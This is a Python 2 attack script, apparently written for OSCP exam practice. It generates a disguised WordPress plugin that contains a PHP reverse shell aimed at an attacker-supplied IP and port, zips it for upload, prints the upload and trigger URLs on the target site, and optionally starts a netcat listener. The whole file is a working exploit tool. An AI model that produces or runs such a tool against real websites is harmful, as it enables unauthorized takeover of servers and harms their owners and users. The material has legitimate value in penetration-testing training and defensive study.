#!/usr/bin/env python
#
# Script name     : wordown.py
# Version         : 2.0
# Created date    : 5/27/2018
# Last update     : 5/27/2018
# Author          : Hunter Friday
# Inspired by     : wordpwn.py by wetw0rk (https://github.com/wetw0rk/malicious-wordpress-plugin)
# Python version  : 2.7
# Description     : Generates a wordpress plugin that will grant you a reverse shell once uploaded and navigated to. I loved wetw0rk's script, but I didn't want to use Meterpreter during my time preparing for the OSCP exam so I modified his to generate a reverse shell instead. Props go to wetw0rk. Not sure if the Windows functionality is there but it definitely works against Linux.

import os, random, sys, zipfile, subprocess, requests

try:

	LHOST = str(sys.argv[1])
	LPORT = str(sys.argv[2])
	HANDLER = sys.argv[3]
	PLATFORM = sys.argv[4]
	if PLATFORM == 'w':
		PLATFORM = 'windows'
	elif PLATFORM == 'u':
		PLATFORM = 'unix'
	else:
		pass

except IndexError:

	print "Usage: %s [LHOST] [LPORT] [HANDLER] [PLATFORM]" % sys.argv[0]
	print "Example: %s 192.168.0.0 1444 Y u" % sys.argv[0]
	sys.exit()

def generate_plugin(LHOST, LPORT):

	# Our "Plugin" Contents
	print "[+] Generating plugin script"
	plugin_script = "<?php\n"
	plugin_script += "/**\n"
	plugin_script += " * Plugin Name: %s\n" % ('Inconspicous')
	plugin_script += " * Version: %d.%d.%d\n" % (random.randint(1, 10), random.randint(1, 10), random.randint(1, 10))
	plugin_script += " * Author: Friday\n"
	plugin_script += " * Author URI: http://notreal.com\n"
	plugin_script += " * License: Not Legit\n"
	plugin_script += " */\n"
	plugin_script += "?>\n"

	# Write Plugin Contents To File
	print "[+] Writing plugin script to file"
	plugin_file = open('SatisfyPlugin.php','w')
	plugin_file.write(plugin_script)
	plugin_file.close()

	# Generate Payload
        print "[+] Generating payload: payload.php"
        lines = []
	copy_cmd = "cp /usr/share/webshells/php/php-reverse-shell-%s.php payload.php" % PLATFORM
	subprocess.call(copy_cmd, shell=True)
        with open("payload.php", "r") as f:
            for line in f:
                if "CHANGE THIS" not in line:
                    lines.append(line)
                elif "ip" in line:
                    newline = "$ip = \'%s\'; // CHANGE THIS\n" % LHOST
                    lines.append(newline)
                else:
                    newline = "$port = %s; // CHANGE THIS\n" % LPORT
                    lines.append(newline)
        with open("payload.php", "w") as f:
            for line in lines:
                f.write(line)

	# Create Zip With Payload
	print "[+] Writing files to zip"
	make_zip = zipfile.ZipFile('inconspicuous.zip', 'w')
	make_zip.write('payload.php')
	make_zip.write('SatisfyPlugin.php')
	print "[+] Cleaning up files"
	os.system("rm SatisfyPlugin.php payload.php")
	# Useful Info
	print "[+] General Execution Location: http://<target>/wp-content/plugins/inconspicuous/payload.php"
	print "[+] General Upload Location: http://<target>/wp-admin/plugin-install.php?tab=upload"

def handler(LPORT):
	print "[+] Launching handler"
        handler = "nc -nlvp %s" % LPORT
        os.system(handler)

# Generate Plugin
generate_plugin(LHOST, LPORT)
# Handler
if HANDLER == 'Y':
	handler(LPORT)
else:
	sys.exit()

